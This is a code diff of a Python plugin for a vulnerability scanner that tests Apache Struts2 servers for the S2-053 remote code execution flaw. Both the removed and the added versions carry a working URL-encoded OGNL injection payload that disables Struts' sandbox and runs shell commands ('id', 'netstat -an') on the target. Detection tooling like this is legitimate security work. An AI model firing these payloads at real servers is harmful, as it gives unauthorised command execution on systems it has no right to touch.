@@ -1,70 +1,60 @@
 #!/usr/bin/env python
-# _*_ coding: utf-8 _*_
-
-
-import urllib.parse
+# -*- coding: utf-8 -*-
+from Struts2.CriticalResult import Result
 import requests
-
-import logging
-import ClassCongregation
+from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile
 class VulnerabilityInfo(object):
     def __init__(self,Medusa):
         self.info = {}
+        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
         self.info['author'] = "Ascotbe"  # 插件作者
-        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
-        self.info['algroup'] = "S2_053"  # 插件名称
-        self.info['name'] ='Struts2远程代码执行漏洞' #漏洞名称
+        self.info['createDate'] = "2020-3-14"  # 插件编辑时间
+        self.info['disclosure']='2020-3-11'#漏洞披露时间，如果不知道就写编写插件的时间
+        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability53"  # 插件名称
+        self.info['name'] ='Struts2远程代码执行漏洞53' #漏洞名称
         self.info['affects'] = "Struts2"  # 漏洞组件
         self.info['desc_content'] = ""  # 漏洞描述
         self.info['rank'] = "高危"  # 漏洞等级
         self.info['suggest'] = "尽快升级最新系统"  # 修复建议
+        self.info['version'] = "0"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
-def UrlProcessing(url):
-    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
-        res = urllib.parse.urlparse(url)
-    else:
-        res = urllib.parse.urlparse('http://%s' % url)
-    return res.scheme, res.hostname, res.port
 
+def medusa(Url,RandomAgent,ProxyIp=None):
 
-payload='''redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A'''
-
-def medusa(Url,RandomAgent,ProxyIp):
-
-    scheme, url, port = UrlProcessing(Url)
+    scheme, url, port = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
         port = 443
     elif port is None and scheme == 'http':
         port = 80
     else:
         port = port
-    payload_url = scheme+"://"+url+':'+str(port)+'/hello.action'
-    host=url+':'+str(port)
-    headers = {
-        'Host':host,
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-        'User-Agent': RandomAgent,
-        'Connection': 'close',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Content-Length': '981',
-        'DNT': '1',
-        'Referer':payload_url,
-        'Upgrade-Insecure-Requests': '1'
-    }
-    try:
-        s = requests.session()
-        resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
-        con = resp.text
-        code = resp.status_code
-        if code==200 and con.lower().find('uid')!=-1 and con.lower().find('gid')!=-1 and con.lower().find('groups')!=-1:
-            Medusa = "{}存在Struts2远程代码执行漏洞 \r\n漏洞详情:\r\n影响版本:Struts2_0_1-Struts2_3_33,Struts2_5-Struts2_5_10\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload)
-            _t = VulnerabilityInfo(Medusa)
-            web = ClassCongregation.VulnerabilityDetails(_t.info)
-            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
-    except:
-        _ = VulnerabilityInfo('').info.get('algroup')
-        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
+    m = [
+        "id",
+        "name",
+        "filename",
+        "username",
+        "password",
+    ]
+    for i in m :
+        try:
+
+            payload_url = scheme + "://" + url +":"+ str(port)+"/index.action?" + i + "=" + "'''%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat%20-an%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D'''"
+            headers = {
+                'User-Agent': RandomAgent,
+                "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
+                "Content-Type": "application/x-www-form-urlencoded"
+            }
+
+            resp = requests.get(payload_url,headers=headers, timeout=6, verify=False)
+            con = resp.text
+            resilt = Result(con)
+            if resilt == "Linux" or resilt == "NoteOS" or resilt == "Windows":
+                Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n版本号:S2-53\r\n返回数据:{}\r\n".format(url, con, resilt)
+                _t=VulnerabilityInfo(Medusa)
+                web=VulnerabilityDetails(_t.info)
+                web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+                WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
+        except Exception:
+            _ = VulnerabilityInfo('').info.get('algroup')
+            _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
